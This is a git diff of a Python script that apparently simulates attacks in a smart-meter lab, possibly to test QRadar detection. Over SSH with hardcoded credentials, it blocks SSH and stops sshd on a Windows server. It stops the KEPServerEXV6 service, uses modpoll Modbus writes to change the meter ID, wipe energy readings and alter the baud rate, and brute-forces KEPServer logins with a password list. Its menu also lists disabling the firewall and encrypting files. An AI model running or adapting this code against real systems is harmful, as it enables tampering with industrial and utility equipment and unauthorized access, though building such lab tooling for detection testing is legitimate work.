@@ -34,11 +34,13 @@ COPIED_PATH = "C:\\Windows\\temp\\Smartmeter"
 # Set the path for the Smart Meter folder
 SMARTMETER_PATH = "C:\\Users\\Student\\Documents\\AttackFolder"
 
+# Default credentials for windows server
 USERNAME = "Student"
 PASSWORD = "Student12345@"
 WINDOWS_SERVER_IP = "172.16.2.223"
 
-POWERSHELL_SCRIPT_PATH = r"Powershell\baseScriptElevated.ps1"
+# Path for the Modpoll
+MODPOLL_PATH = r"C:\Windows\Temp\SmartMetertest"
 
 
 ###########
@@ -174,38 +176,41 @@ def disable_firewall():
 # Disable SSH from the firewall
 def disable_ssh():
     count = 0
-    command_output = run('netsh advfirewall firewall add rule name="QRadar Test" dir=in action=block protocol=TCP localport=22',stdout=PIPE)
+    command_output = ssh_run_commands('netsh advfirewall firewall add rule name="QRadar Test" dir=in action=block protocol=TCP localport=22')
     if "Ok." in command_output:
         count += 1
         print("Inbound Firewall Successfully Inserted (Blocked: TCP/22)")
     else:
         print("Inbound Firewall Failed to be Inserted")
-    cp = run('netsh advfirewall firewall add rule name="QRadar Test 2" dir=in action=block protocol=UDP localport=22',stdout=PIPE)
-    if cp.stdout.decode('utf-8').strip() == "Ok.":
+
+    command_output = ssh_run_commands('netsh advfirewall firewall add rule name="QRadar Test 2" dir=in action=block protocol=UDP localport=22')
+    if "Ok." in command_output:
         count += 1
         print("Inbound Firewall Successfully Inserted (Blocked: UDP/22)")
     else:
         print("Inbound Firewall Failed to be Inserted")
-    cp = run('netsh advfirewall firewall add rule name="QRadar Test 3" dir=out action=block protocol=TCP localport=22',stdout=PIPE)
-    if cp.stdout.decode('utf-8').strip() == "Ok.":
+
+    command_output = ssh_run_commands('netsh advfirewall firewall add rule name="QRadar Test 3" dir=out action=block protocol=TCP localport=22')
+    if "Ok." in command_output:
         count += 1
         print("Outbound Firewall Successfully Inserted (Blocked: TCP/22)")
     else:
         print("Outbound Firewall Failed to be Inserted")
-    cp = run('netsh advfirewall firewall add rule name="QRadar Test 4" dir=out action=block protocol=UDP localport=22',stdout=PIPE)
-    if cp.stdout.decode('utf-8').strip() == "Ok.":
+        
+    command_output = ssh_run_commands('netsh advfirewall firewall add rule name="QRadar Test 4" dir=out action=block protocol=UDP localport=22')
+    if "Ok." in command_output:
         count += 1
         print("Outbound Firewall Successfully Inserted (Blocked: UDP/22)")
     else:
         print("Outbound Firewall Failed to be Inserted")
 
     service_name = "sshd"
-    cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
-    output = cp.stdout.decode('utf-8').strip().split()
-    if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]))
+    command_output = ssh_run_commands(f"sc stop {service_name}")
+
+    if "FAILED" in command_output:
+        print(f"FAILED: {command_output}")
     else:
-        print("The " + output[1] + " service is " + output[9])
+        print(f"sshd service stopped")
         count += 1
 
     if count > 4:
@@ -213,42 +218,22 @@ def disable_ssh():
     else:
         print("SSH Failed to Disable.\nFail.\n")
 
-# Stop the KEPServerEXV6 service
-def disable_kepserver():
-    service_name = "KEPServerEXV6"
-    cp = runPowerShellScript(POWERSHELL_SCRIPT_PATH, "sc stop KEPServerEXV6")
-    #cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
-    print(cp)
-    output = cp.stdout.decode('utf-8').strip().split()
-    if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
-    else:
-        print("The " + output[1] + " service is " + output[9] + "\nOk.\n")
-
 #Run modpoll to interrupt COM1 port
 def run_modinterrupt():
-    netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
-    if "RUNNING" in netshare.stdout:
-        print("Kepserver is running, Stopping now.")
-        service_name = "KEPServerEXV6"
-        cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
-        output = cp.stdout.decode('utf-8').strip().split()
-        if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
-        else:
-            print("The " + output[1] + " service is " + output[9])
-            sleep(15)
+    kep_server_stop()
 
-    current_directory = getcwd()
-    executable_path = current_directory + "\\modpoll.exe"
+    executable_path = MODPOLL_PATH + r"\modpoll.exe"
 
-    checkmodpoll = run(['modpoll.exe', "-1", "-b", '9600', '-p', 'none', '-m', 'rtu', '-a', '2', 'COM1'], stdout=PIPE, stderr=PIPE, text=True)
+    parameters = ["-1", "-b", '9600', '-p', 'none', '-m', 'rtu', '-a', '2', 'COM1']
+    
+    check_modpoll = ssh_run_commands(f"{executable_path} {' '.join(parameters)}")
 
-    if "Polling" in checkmodpoll.stdout:
+    # FIXME: Get the baudrate to run with this.
+    if "Polling" in check_modpoll:
         print("Modinterrupt is running \nOk.\n")
         parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "2", "COM1"]
         try:
-            run(['modpoll.exe', "-b", '9600', '-p', 'none', '-m', 'rtu', '-a', '2', 'COM1'], stdout=PIPE, stderr=PIPE, text=True)
+            ssh_run_commands(f"{executable_path} {' '.join(parameters)}")
         except CalledProcessError as e:
             print("Error executing the executable file:", e)
     else:
@@ -399,95 +384,41 @@ def decrypt(dataFile, privatekey):
 #Run modpoll to change register 40201 to 26
 def change_meterID():
 
-    netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
-    if "RUNNING" in netshare.stdout:
-        print("Kepserver is running, Stopping now.")
-        service_name = "KEPServerEXV6"
-        cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
-        output = cp.stdout.decode('utf-8').strip().split()
-        if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
-        else:
-            print("The " + output[1] + " service is " + output[9])
-            sleep(15)
+    kep_server_stop()
     
-
-    current_directory = getcwd()
-    executable_path = current_directory + "\\modpoll.exe"
+    executable_path = MODPOLL_PATH + r"\modpoll.exe"
 
     parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-r", "201", "COM1", "26"]
-    try:
-        check_call([executable_path] + parameters)
 
-        sleep(15)
+    # FIXME: Try except for running the executable is gone
+    print(ssh_run_commands(f"{executable_path} {' '.join(parameters)}"))
+    kep_server_start()
 
-        service_name = "KEPServerEXV6"
-        cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
-        output = cp.stdout.decode('utf-8').strip().split()
-        if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]))
-            print("Fail.\n")
-        else:
-            print("The " + output[1] + " service is " + output[9])
-
-        print("\nOk.\n")
-    except CalledProcessError as e:
-        print("Error executing the executable file:", e)
-        print("Fail.\n")
+    print("\nOk.\n")
 
 
 def clear_energy_reading():
 
-    netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
-    if "RUNNING" in netshare.stdout:
-        print("Kepserver is running, Stopping now.")
-        service_name = "KEPServerEXV6"
-        cp = run(["sc", "stop", service_name],stdout=PIPE , check=False)
-        output = cp.stdout.decode('utf-8').strip().split()
-        if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
-        else:
-            print("The " + output[1] + " service is " + output[9])
-            sleep(15)
+    kep_server_stop()
 
-    current_directory = getcwd()
-    executable_path = current_directory + "\\modpoll.exe"
-    checkEnergy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-c", "11", "-1", "-r", "26", "COM1"]
-    clearEnergy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-1", "-r", "253", "COM1", "78"]
-    try:
-        check_call([executable_path] + checkEnergy)
-        check_call([executable_path] + clearEnergy)
-        check_call([executable_path] + checkEnergy)
+    executable_path = MODPOLL_PATH + r"\modpoll.exe"
+    check_energy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-c", "11", "-1", "-r", "26", "COM1"]
+    clear_energy = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "25", "-1", "-r", "253", "COM1", "78"]
+    
+    # FIXME: Try except for running the executable is gone
+    print(ssh_run_commands(f"{executable_path} {' '.join(check_energy)}"))
+    print(ssh_run_commands(f"{executable_path} {' '.join(clear_energy)}"))
+    print(ssh_run_commands(f"{executable_path} {' '.join(check_energy)}"))
 
-        print("Energy Reading Cleared.")
+    print("Energy Reading Cleared.")
 
-        service_name = "KEPServerEXV6"
-        cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
-        output = cp.stdout.decode('utf-8').strip().split()
-        if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]))
-            print("Fail.\n")
-        else:
-            print("The " + output[1] + " service is " + output[9])
+    kep_server_start()
 
-        print("\nOk.\n")
-    except CalledProcessError as e:
-        print("Error executing the executable file:", e)
-        print("Fail.\n")
+    print("\nOk.\n")
 
 def kep_bruteforce():
 
-    netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
-    if "RUNNING" not in netshare.stdout:
-        print("Kepserver is not running, Starting now.")
-        service_name = "KEPServerEXV6"
-        cp = run(["sc", "start", service_name],stdout=PIPE , check=False)
-        output = cp.stdout.decode('utf-8').strip().split()
-        if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
-        else:
-            print("The " + output[1] + " service is " + output[9])
-            sleep(15)
+    kep_server_start()
 
     usernames = ["Admin", "Administrator"]
     passwords = ["michael", "superman" , "7777777", "administrator2022" , "johnsnow"]
@@ -497,8 +428,9 @@ def kep_bruteforce():
         for password in passwords:
             print("Trying Username: " + username +", Trying Password: " + password)
             # Read and print each line in the file
+            # BUG: Why open KEPServerProperties?
             try:
-                server = kepconfig.connection.server(host = '127.0.0.1', port = 57412, user = username, pw = password)
+                server = kepconfig.connection.server(host = WINDOWS_SERVER_IP, port = 57412, user = username, pw = password)
                 output = server.get_project_properties()
                 with open(COPIED_PATH + "\\KEPServerProperties.txt", "w") as f:
                     f.write(str(output))
@@ -513,25 +445,14 @@ def kep_bruteforce():
         print("\nFail.")
 
 #Run modpoll to change baud rate - Register 40206 
-def change_baudrate():
-    netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
-    if "RUNNING" in netshare.stdout:
-        print("Kepserver is running, Stopping now.")
-        service_name = "KEPServerEXV6"
-        cp = run(["sc", "stop", service_name], stdout=PIPE, check=False)
-        output = cp.stdout.decode('utf-8').strip().split()
-        if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
-        else:
-            print("The " + output[1] + " service is " + output[9])
-            sleep(15)
+def baudrate_change():
+    kep_server_stop()
 
-    current_directory = getcwd()
-    executable_path = current_directory + "\\modpoll.exe"
+    executable_path = MODPOLL_PATH + r"\modpoll.exe"
 
-    # Call checkBaudRate to determine current baudrate
-    current_baudrate = checkBaudRate()
-    print(f"Current BaudRate:{current_baudrate}",file=sys.stdout)
+    # Call baudrate_check to determine current baudrate
+    current_baudrate = baudrate_check()
+    print(f"Current BaudRate:{current_baudrate}", file=sys.stdout)
 
     # Use current_baudrate value to set the new baudrate value in parameters list
     new_baudrate = None
@@ -546,80 +467,40 @@ def change_baudrate():
         new_baudrate = "0"
         identifyBR = "4800"
     else:
-        print("Error: Unknown baudrate",file=sys.stdoutt)
+        print("Error: Unknown baudrate", file=sys.stdout)
         return
 
-    print(f"Changed Current BaudRate:{current_baudrate} to {new_baudrate} = {identifyBR}",file=sys.stdout)
+    print(f"Changed Current BaudRate:{current_baudrate} to {new_baudrate} = {identifyBR}", file=sys.stdout)
 
     parameters = ["-b", current_baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "206", "COM1", new_baudrate]
-    try:
-        check_call([executable_path] + parameters)
+    
+    ssh_run_commands(f"{executable_path} {' '.join(parameters)}")
+    kep_server_start()
 
-        sleep(15)
+def baudrate_check():
+    kep_server_stop()
 
-        service_name = "KEPServerEXV6"
-        cp = run(["sc", "start", service_name], stdout=PIPE, check=False)
-        output = cp.stdout.decode('utf-8').strip().split()
-        if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]))
-            print("Fail.\n")
-        else:
-            print("The " + output[1] + " service is " + output[9])
-
-        print("\nOk.\n")
-    except CalledProcessError as e:
-        print("Error executing the executable file:", e)
-        print("Fail.\n")
-
-def checkBaudRate():
-    netshare = run(['sc', 'query', 'KEPServerEXV6'], stdout=PIPE, stderr=PIPE, text=True)
-    if "RUNNING" in netshare.stdout:
-        print("Kepserver is running, Stopping now.")
-        service_name = "KEPServerEXV6"
-        cp = run(["sc", "stop", service_name], stdout=PIPE, check=False)
-        output = cp.stdout.decode('utf-8').strip().split()
-        if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]) + "\nFail.\n")
-        else:
-            print("The " + output[1] + " service is " + output[9])
-            sleep(15)
-
-    current_directory = getcwd()
-    executable_path = current_directory + "\\modpoll.exe"
+    executable_path = MODPOLL_PATH + r"\modpoll.exe"
 
     found_baudrate = 0
     baudrate_list = ["4800", "9600", "19200"]
 
     for baudrate in baudrate_list:
         parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "206", "-1", "COM1"]
-        # cp = run([executable_path] + parameters, stdout=PIPE, stderr=PIPE, check=False)
-        # baudRateOutput = cp.stdout.decode('utf-8').strip().split()
-        baudRateOutput = run([executable_path] + parameters, stdout=PIPE, stderr=PIPE, text=True)
+        baudrate_output = ssh_run_commands(f"{executable_path} {' '.join(parameters)}")
 
         print(f"Checking baudrate {baudrate}:")
         # print(baudRateOutput)
        
-        if "[206]:" in baudRateOutput.stdout:
+        if "[206]:" in baudrate_output:
             print(f"Baudrate is {baudrate}\n")
             found_baudrate = baudrate
             break
         else:
             print(f"Baudrate is not {baudrate}\n")
         
-    try: 
-        service_name = "KEPServerEXV6"
-        cp = run(["sc", "start", service_name], stdout=PIPE, check=False)
-        output = cp.stdout.decode('utf-8').strip().split()
-        if "FAILED" in cp.stdout.decode('utf-8'):
-            print("FAILED: " + " ".join(output[4:]))
-            print("Fail.\n")
-        else:
-            print("The " + output[1] + " service is " + output[9])
-
-        print("\nOk.\n")
-    except CalledProcessError as e:
-        print("Error executing the executable file:", e)
-        print("Fail.\n")
+    kep_server_start()
+    print("\nOk.\n")
 
     return found_baudrate
 
@@ -639,7 +520,7 @@ def smartmeter_get_hardware_info():
     current_directory = getcwd()
     executable_path = current_directory + "\\modpoll.exe"
 
-    baudrate = checkBaudRate()
+    baudrate = baudrate_check()
     if baudrate in ["4800", "9600", "19200"]:
         parameters = ["-b", baudrate, "-p", "none", "-m", "rtu", "-a", "25", "-r", "9005", "-1", "COM1"]
         # cp = run([executable_path] + parameters, stdout=PIPE, stderr=PIPE, check=False)
@@ -700,7 +581,7 @@ def smartmeter_get_hardware_info():
         
 
 
-
+# TODO: REVERT THIS THING PAIN.
 def revert(revertoption):
     # 1 To enable firewall, 2 to remove firewall rule, 3 to re-enable KEPService, 4 to re-enable comport, 5 to decrypt files, 6 to change register 40201 back to 25
     if revertoption == "1":
@@ -1253,10 +1134,9 @@ if __name__ == '__main__':
         case "stop":  kep_server_stop()
         case "1":  create_scheduled_task() 
         #case "2":  create_shared_folder(), copy_file(SMARTMETER_PATH)
-        
         case "3":  disable_firewall()
         case "4":  disable_ssh()
-        case "5":  disable_kepserver()
+        case "5":  kep_server_stop()
         case "6":  run_modinterrupt()
         case "7":  disable_COMPort()
         case "8":  encrypt_files()
@@ -1264,7 +1144,7 @@ if __name__ == '__main__':
         case "10": clear_energy_reading()
         case "11": revert(revert_option := str(argv[2]))
         case "12": kep_bruteforce()
-        case "13": change_baudrate() # TODO: Disable and enable kep server function, simplifying function 13 and 14
+        case "13": baudrate_change()
         case "14": smartmeter_get_hardware_info()
         case "15": kep_server_info()
         case "16": kep_get_all_users()
